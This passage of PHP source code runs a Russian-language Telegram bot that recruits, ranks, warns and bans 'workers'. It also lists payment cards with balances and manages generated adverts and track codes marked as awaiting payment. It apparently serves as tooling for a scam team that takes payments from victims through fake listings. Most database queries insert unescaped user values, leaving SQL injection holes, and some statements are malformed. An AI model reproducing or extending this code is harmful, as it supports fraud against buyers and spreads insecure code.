                        mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` > '1'");

                        send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time() + 24 * 500 * 3600));
                        send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time() + 24 * 500 * 3600));

                        send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => getMyProfile($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyProfile($user_id, 1, 1)));

                        $text = "⚠️ <b>Модератор</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>выдал предупреждение</b> <a href=\"tg://user?id=$user_id\">воркеру</a> <code>[" . ($user['warns'] + 1) . "/3]</code>\n\n";
                        $text .= "Воркер был заблокирован";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        $text = "⚠️ <b>Модератор выдал вам предупреждение</b> <code>[" . ($user['warns'] + 1) . "/3]</code>\n\n";
                        $text .= "Для вас доступ был заблокирован";
                        send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                } else {
                    $text = "😒 <b>Данный воркер уже заблокирован или неактивирован</b>";
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                }
            }
        }

        if (preg_match('/^\/ban\/\d+\/$/', $callback['type'])) {
            $user_id = substr($callback['type'], 5, -1);

            if ($user_id == '808326111' OR $user_id == '1204750285') {
                $text = "😡 <b>Ты ахуел,ты каво банеш?</b>";
                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders1'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            } else {
                $search = mysqli_query($connection, "SELECT `telegram` FROM `accounts` WHERE `telegram` = '$user_id' AND `access` != '-1'");

                if (mysqli_num_rows($search) > 0) {
                    mysqli_query($connection, "UPDATE `accounts` SET `access` = '-1', `card` = '0' WHERE `telegram` = '$user_id'");
                    mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");
                    mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` >= '0'");

                    send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id, 'until_date' => time() + 24 * 500 * 3600));
                    send($config['token'], 'kickChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id, 'until_date' => time() + 24 * 500 * 3600));

                    send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => getMyProfile($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyProfile($user_id, 1, 1)));

                    $text = "🚫 <b>Модератор</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>заблокировал</b> <a href=\"tg://user?id=$user_id\">воркера</a>";
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                    $text = "🚫 <b>Модератор заблокировал вам доступ к проекту.</b>";
                    send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                } else {
                    $text = "👽 <b>Пользователь с таким ID не найден или он уже заблокирован</b>";
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                }
            }
        }

        if (preg_match('/^\/unban\/\d+\/$/', $callback['type'])) {
            $user_id = substr($callback['type'], 7, -1);

            $search = mysqli_query($connection, "SELECT `telegram`, `access` FROM `accounts` WHERE `telegram` = '$user_id'");

            if (mysqli_num_rows($search) > 0) {
                $user = mysqli_fetch_assoc($search);

                if ($user['access'] <= 0) {
                    mysqli_query($connection, "UPDATE `accounts` SET `access` = '0', `warns` = '0' WHERE `telegram` = '$user_id'");

                    send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id));
                    send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id));

                    send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => getMyProfile($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyProfile($user_id, 1, 1)));

                    $text = "♻️ <b>Модератор</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>разблокировал</b> <a href=\"tg://user?id=$user_id\">воркера</a>";
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                    $text = "♻️ <b>Модератор разблокировал вам доступ к проекту.</b>\n\n";
                    $text .= "Можете подать свою заявку в команду, /start";
                    send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                } else {
                    send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $user_id));
                    send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $user_id));

                    $text = "♻️ <b>Воркер не заблокирован, но был вынесен из черного списка в беседах</b>";
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                }
            } else {
                $text = "👽 <b>Пользователь с таким ID не найден или он уже заблокирован</b>";
                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders1'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            }
        }

        if (preg_match('/\/adverts\/\d+\//', $callback['type'])) {
            $user_id = substr($callback['type'], 9, -1);

            send($config['token'], 'sendMessage', Array('chat_id' => $callback['chat_id'], 'text' => getMyAdverts($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyAdverts($user_id, 1, 1)));
        }

        if (preg_match('/\/join\/(\w+\/\d+|\w+\/|)/', $callback['type'])) {
            if ($callback['type'] == '/join/') {
                $query = mysqli_query($connection, "SELECT `id`, `value1`, `value2`, `value3`, `value4`, `status` FROM `requests` WHERE `telegram` = '$callback[from]' AND `status` >= '0' AND `status` < '3' ORDER BY `id` DESC");

                if (mysqli_num_rows($query) > 0) {
                    $request = mysqli_fetch_assoc($query);

                    if ($request['status'] == 1) {
                        $text = "📨 <b>Ваша заявка готова к отправке, провьте её:</b>\n\n";
                        $text .= "<b>Где нашли:</b> <i>$request[value1]</i>\n";
                        $text .= "<b>Опыт работы:</b> <i>$request[value2]</i>\n";
                        $text .= "<b>Время работы:</b> <i>$request[value3]</i>\n";
                        if ($request['value4'] == 0) {
                            $text .= "<b>Кто вас пригласил:</b> <i>Никто</i>\n";
                        } else {
                            $text .= "<b>Кто вас пригласил:</b> <a href=\"tg://user?id=$request[value4]\">$request[value4]</a>\n";
                        }
                        $keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✔️ Отправить', 'callback_data' => '/join/send'), Array('text' => '🗑 Отменить', 'callback_data' => '/join/cancel/')))));
                        send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                    } elseif ($request['status'] == 2) {
                        $text = "⏱ <b>Ваша заявка находится на проверке у модераторов</b>\n\n";
                        send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } elseif (empty($request['value1']) AND empty($request['value2']) AND empty($request['value3'])) {
                        $text = "Откуда вы узнали о нас?";
                        send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } elseif (isset($request['value1']) AND empty($request['value2']) AND empty($request['value3'])) {
                        $text = "Есть ли опыт в подобной сфере, если да, то какой?";
                        send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } elseif (isset($request['value1']) AND isset($request['value2']) AND empty($request['value3'])) {
                        $text = "Сколько времени вы готовы уделять работе и какого результата вы хотите добиться?";
                        send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } elseif (isset($request['value1']) AND isset($request['value2']) AND isset($request['value3'])) {
                        $text = "Кто вас пригласил?";
                        send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                } else {
                    $fullname = mysqli_real_escape_string($connection, $callback[firstname]) . " " . mysqli_real_escape_string($connection, $callback[lastname]);
                    mysqli_query($connection, "INSERT INTO `requests` (`username`, `name`, `telegram`, `rules`, `status`, `time`) VALUES ('$callback[username]', '$fullname', '$callback[from]', '0', '0', '" . time() . "')");
                    $text = "Уберите все смайлики из ника! Бот их не распознает!\n";
                    $text .= "1. Запрещено медиа с некорректным содержанием (порно, насилие, убийства, призывы к экстремизму, реклама наркотиков)\n";
                    $text .= "2. Запрещен спам, флуд, пересылки с других каналов, ссылки на сторонние ресурсы\n";
                    $text .= "3. Запрещено узнавать у друг друга персональную информацию\n";
                    $text .= "4. Запрещено оскорблять администрацию\n";
                    $text .= "5. Запрещено попрошайничество в беседе работников\n";
                    $text .= "6. Администрация не несёт ответственности за блокировку ваших кошельков/карт\n";
                    $text .= "\nВы подтверждаете, что ознакомились и согласны с условиями и правилами нашего проекта?";
                    $keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✅ Полностью согласен', 'callback_data' => '/join/accept/')))));
                    send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => $text, 'reply_markup' => $keyboard));
                }
            } elseif ($callback['type'] == '/join/accept/') {
                mysqli_query($connection, "UPDATE `requests` SET `rules` = '1' WHERE `telegram` = '$callback[from]' AND `status` = '0'");
                $text = "1. Запрещено медиа с некорректным содержанием (порно, насилие, убийства, призывы к экстремизму, реклама наркотиков)\n";
                $text .= "2. Запрещен спам, флуд, пересылки с других каналов, ссылки на сторонние ресурсы\n";
                $text .= "3. Запрещено узнавать у друг друга персональную информацию\n";
                $text .= "4. Запрещено оскорблять администрацию\n";
                $text .= "5. Запрещено попрошайничество в беседе работников\n";
                $text .= "6. Администрация не несёт ответственности за блокировку ваших кошельков/карт\n";
                $text .= "\n✅ Вы приняли наши правила";
                send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => $text, 'reply_markup' => ''));
                $text = "Откуда вы узнали о нас?";
                send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                $text = "➕ <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>начал заполнение заявки в команду</b>\n";
                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            } elseif ($callback['type'] == '/join/send/') {
                $query = mysqli_query($connection, "SELECT `id`, `value1`, `value2`, `value3`, `value4` FROM `requests` WHERE `telegram` = '$callback[from]' AND `status` = '1' ORDER BY `id` DESC");

                if (mysqli_num_rows($query) > 0) {
                    $request = mysqli_fetch_assoc($query);
                    mysqli_query($connection, "UPDATE `requests` SET `status` = '2' WHERE `id` = '$request[id]'");
                    $text = "🐣 <b>Новая заявка в команду</b>\n\n";
                    $text .= "<b>Никнейм:</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a>\n";
                    $text .= "<b>Telegram ID:</b> <code>$callback[from]</code>\n";
                    $text .= "<b>Где нашел:</b> <i>$request[value1]</i>\n";
                    $text .= "<b>Опыт работы:</b> <i>$request[value2]</i>\n";
                    $text .= "<b>Время работы:</b> <i>$request[value3]</i>\n";
                    if ($request['value4'] == 0) {
                        $text .= "<b>Кто вас пригласил:</b> <i>Никто</i>\n";
                    } else {
                        $text .= "<b>Кто пригласил:</b> <a href=\"tg://user?id=$request[value4]\">$request[value4]</a>\n\n";
                    }
                    $keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✔️ Одобрить', 'callback_data' => '/join/approve/' . $request['id']), Array('text' => '❌ Отклонить', 'callback_data' => '/join/reject/' . $request['id'])))));
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                    $text = "💌 <b>Ваша заявка была отправлена модераторам</b>\n\n";
                    $text .= "Ответ вам придёт после решения модераторов\n";
                    send($config['token'], 'editMessageReplyMarkup', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'reply_markup' => ''));
                    send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    $text = "➕ <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>отправил свою заявку на проверку модераторам</b>\n";
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                }
            } elseif ($callback['type'] == '/join/cancel/') {
                $query = mysqli_query($connection, "SELECT `id` FROM `requests` WHERE `telegram` = '$callback[from]' AND `status` >= '0' AND `status` < '3' ORDER BY `id` DESC");

                if (mysqli_num_rows($query) > 0) {
                    $request = mysqli_fetch_assoc($query);

                    mysqli_query($connection, "UPDATE `requests` SET `status` = '-1' WHERE `id` = '$request[id]'");
                    $text = "🗑 <b>Ваша заявка была удалена</b>";
                    send($config['token'], 'editMessageReplyMarkup', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'reply_markup' => ''));
                    send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    $text = "🗑 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>отменил свою заявку в команду</b>\n";
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                }
            } elseif (preg_match('/\/join\/approve\/\d{0,9}/', $callback['type'])) {
                $isAccess = mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` >= '100'");

                if (mysqli_num_rows($isAccess) > 0) {
                    $request_id = substr($callback['type'], 14);

                    $access = mysqli_fetch_assoc($isAccess);
                    if ($access['access'] >= 100) $rank = 'Помощник';
                    if ($access['access'] >= 500) $rank = 'Модератор';

                    $query = mysqli_query($connection, "SELECT `username`, `name`, `telegram`, `value1`, `value2`, `value3`, `value4`, `msg` FROM `requests` WHERE `id` = '$request_id' AND `status` = '2'");

                    if (mysqli_num_rows($query) > 0) {
                        $request = mysqli_fetch_assoc($query);
                        $users = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$request[telegram]'");
                        $msg = array_diff(explode(',', trim($request['msg'])), Array(NULL));
                        if (mysqli_num_rows($users) > 0) {
                            mysqli_query($connection, "UPDATE `requests` SET `status` = '3' WHERE `id` = '$request_id'");
                            mysqli_query($connection, "UPDATE `accounts` SET `username` = '$request[username]', `access` = '1', `stake` = '$settings[stake]', `card` = '0' WHERE `telegram` = '$request[telegram]'");
                        } else {
                            mysqli_query($connection, "UPDATE `requests` SET `status` = '3' WHERE `id` = '$request_id'");
                            mysqli_query($connection, "INSERT INTO `accounts` (`username`, `telegram`, `wallet`, `access`, `stake`, `card`, `inviter`, `created`) VALUES ('$request[username]', '$request[telegram]', '0', '1', '$settings[stake]', '0', '$request[value4]', '" . time() . "')");
                        }

                        send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['workers'], 'user_id' => $request['telegram']));
                        send($config['token'], 'unbanChatMember', Array('chat_id' => $config['chat']['payments'], 'user_id' => $request['telegram']));

                        if ($request['value4'] != 0) {
                            $text = "👔 <b>У вас новый реферал</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $request['value4'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        }

                        $text = "🐣 <b>Новая заявка в команду</b>\n\n";
                        $text .= "<b>Никнейм:</b> <a href=\"tg://user?id=$request[telegram]\">$request[name]</a>\n";
                        $text .= "<b>Telegram ID:</b> <code>$request[telegram]</code>\n";
                        $text .= "<b>Где нашел:</b> <i>$request[value1]</i>\n";
                        $text .= "<b>Опыт работы:</b> <i>$request[value2]</i>\n";
                        $text .= "<b>Время работы:</b> <i>$request[value3]</i>\n";
                        if ($request['value4'] == 0) {
                            $text .= "<b>Кто вас пригласил:</b> <i>Никто</i>\n\n";
                        } else {
                            $text .= "<b>Кто вас пригласил:</b> <a href=\"tg://user?id=$request[value4]\">$request[value4]</a>\n\n";
                        }
                        $text .= "<b>$rank</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>одобрил заявку</b>";
                        send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['moders'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => ''));
						send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['moders1'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => ''));
                        $text = "🙂 <b>Модераторы одобрили вашу заявку</b>\n\n";
                        $text .= "Теперь вам доступен дополнительный функционал бота!\n\n";
                        $text .= "Введите /help, чтобы отобразить список команд\n";
                        $text .= "<b>Чат воркеров:</b>" . $config['invites']['workers'];
                        $keyboard = json_encode(Array('keyboard' => Array(Array('💀 Мой профиль', '🗃 Мои объявления'), Array('📱 Генерация объявлений', '✈️ Транспортные компании')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
                        send($config['token'], 'sendMessage', Array('chat_id' => $request['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                        $text = "➕ <b>$rank</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>принял заявку в команду от </b> <a href=\"tg://user?id=$request[telegram]\">$request[name]</a>\n";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                }
            } elseif (preg_match('/\/join\/reject\/\d{0,9}/', $callback['type'])) {
                $isAccess = mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` >= '100'");

                if (mysqli_num_rows($isAccess) > 0) {
                    $request_id = substr($callback['type'], 13);

                    $access = mysqli_fetch_assoc($isAccess);
                    if ($access['access'] >= 100) $rank = 'Помощник';
                    if ($access['access'] >= 500) $rank = 'Модератор';

                    $query = mysqli_query($connection, "SELECT `name`, `telegram`, `value1`, `value2`, `value3`, `value4`, `msg` FROM `requests` WHERE `id` = '$request_id' AND `status` = '2'");

                    if (mysqli_num_rows($query) > 0) {
                        $request = mysqli_fetch_assoc($query);
                        $msg = array_diff(explode(',', trim($request['msg'])), Array(NULL));
                        mysqli_query($connection, "UPDATE `requests` SET `status` = '-1' WHERE `id` = '$request_id'");
                        $text = "🐣 <b>Новая заявка в команду</b>\n\n";
                        $text .= "<b>Никнейм:</b> <a href=\"tg://user?id=$request[telegram]\">$request[name]</a>\n";
                        $text .= "<b>Telegram ID:</b> <code>$request[telegram]</code>\n";
                        $text .= "<b>Где нашел:</b> <i>$request[value1]</i>\n";
                        $text .= "<b>Опыт работы:</b> <i>$request[value2]</i>\n";
                        $text .= "<b>Время работы:</b> <i>$request[value3]</i>\n";
                        if ($request['value4'] == 0) {
                            $text .= "<b>Кто вас пригласил:</b> <i>Никто</i>\n\n";
                        } else {
                            $text .= "<b>Кто вас пригласил:</b> <a href=\"tg://user?id=$request[value4]\">$request[value4]</a>\n\n";
                        }
                        $text .= "<b>$rank</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>отклонил заявку</b>\n";

                        send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['moders'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => ''));
						send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['moders1'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => ''));
                        $text = "🙁 <b>Модераторы отклонили вашу заявку</b>\n\n";
                        $text .= "Попробуйте подать заявку в следующий раз\n";
                        send($config['token'], 'sendMessage', Array('chat_id' => $request['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        $text = "➕ <b>$rank</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>отклонил заявку в команду от </b> <a href=\"tg://user?id=$request[telegram]\">$request[name]</a>\n";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }
                }
            }
        }


        if (preg_match('/(\/cards\/\d{1,2}\/)/', $callback['type'])) {
            $isAccess = mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` >= '666'");

            if (mysqli_num_rows($isAccess) > 0) {
                $cur_page = mb_substr($callback['type'], 7, -1);

                $pages = ceil(mysqli_num_rows($query) / 10);

                $offset = $cur_page - 1;
                $back = $cur_page - 1;
                $next = $cur_page + 1;

                if ($pages == $cur_page) $offset = 0;
                if ($pages == $cur_page) $next = 0;
                $back = $pages - 1;

                $i = 0;
                $text = "💳 <b>Информация о загруженных картах</b>\n\n";
                $cards = mysqli_query($connection, "SELECT `amount`, `totalAmount`, `status`, `verify`, `number` FROM `cards` WHERE `status` = '1' ORDER BY `totalAmount` DESC LIMIT 10 OFFSET $offset0");

                while ($row = mysqli_fetch_assoc($cards)) {
                    $i = $i + 1;
                    $users = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `card` = '$row[number]' AND `access` > '0'");
                    if ($row['verify'] == 1) $status = '✅';
                    if ($row['verify'] == 0) $status = '❌';
                    if ($settings['card'] == $row['number']) $i = '💎';
                    $text .= $i . ". — <code>$row[number]</code> | Статус: $status | Баланс: <code>$row[amount] руб.</code>\nПринято: <code>$row[totalAmount] руб.</code> | Используют: <code>" . Endings(mysqli_num_rows($users), "воркер", "воркера", "воркеров") . "</code>\n";
                    $keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '⬅️ Назад', 'callback_data' => '/cards/' . $back . '/'), Array('text' => 'Далее ➡️', 'callback_data' => '/cards/' . $next . '/')))));
                }

                send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['moders'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
            }
        }

        if (preg_match('/\/trackcode\/\d{6,12}\//', $callback['type'])) {
            $code = mb_substr($callback['type'], 11, -1);

            send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => getTrack($callback['from'], $code), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getTrack($callback['from'], $code, 1)));
        }

        if (preg_match('/^\/getcard\/$/', $callback['type']) == TRUE) {
            send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => getCard(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
        }

        if (preg_match('/\/advert\/(\d+|[a-z0-9]{24})\//', $callback['type'])) {
            $advert_id = mb_substr($callback['type'], 8, -1);

            send($config['token'], 'sendMessage', Array('chat_id' => $callback['chat_id'], 'text' => getAdvert($callback['from'], $advert_id), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getAdvert($callback['from'], $advert_id, 1)));
        }

        if (preg_match('/\/hide\/(\d+|[a-z0-9]{24})\//', $callback['type'])) {
            $advert_id = mb_substr($callback['type'], 6, -1);
            mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `advert_id` = '$advert_id'");

            send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getAdvert($callback['from'], $advert_id), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getAdvert($callback['from'], $advert_id, 1)));
        }

        if (preg_match('/\/show\/(\d+|[a-z0-9]{24})\//', $callback['type'])) {
            $advert_id = mb_substr($callback['type'], 6, -1);
            mysqli_query($connection, "UPDATE `adverts` SET `status` = '1', `time` = '" . time() . "' WHERE `advert_id` = '$advert_id'");

            send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getAdvert($callback['from'], $advert_id), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getAdvert($callback['from'], $advert_id, 1)));
            $text = "♻️ <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>восстановил своё объявление</b>\n\n";
            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

        }

        if (preg_match('/\/trackshow\/\d{6,12}\//', $callback['type'])) {
            $code = substr($callback['type'], 11, -1);

            $search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` = '-1'");

            if (mysqli_num_rows($search) > 0) {
                mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '1' WHERE `code` = '$code', `time` = '" . time() . "' AND `worker` = '$callback[from]' AND `status` = '-1'");

                send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1)));
                $text = "♻️ <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>восстановил свой трек-код</b> <code>$code</code>\n\n";
                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            } else {
                $text = "📭 <b>Объявление ещё не создано или не скрыто</b>";
                send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            }
        }

        if (preg_match('/\/trackwait\/\d{6,12}\//', $callback['type'])) {
            $code = substr($callback['type'], 11, -1);

            $search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

            if (mysqli_num_rows($search) > 0) {
                mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '1' WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

                send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1)));
                $text = "📋 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>изменил статус своего трек-код</b> <code>$code</code> <b>на</b> <code>Ожидает оплаты</code>";
                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            } else {
                $text = "📭 <b>Объявление ещё не создано или не скрыто</b>";
                send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            }
        }

        if (preg_match('/\/trackpay\/\d{6,12}\//', $callback['type'])) {
            $code = substr($callback['type'], 10, -1);

            $search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

            if (mysqli_num_rows($search) > 0) {
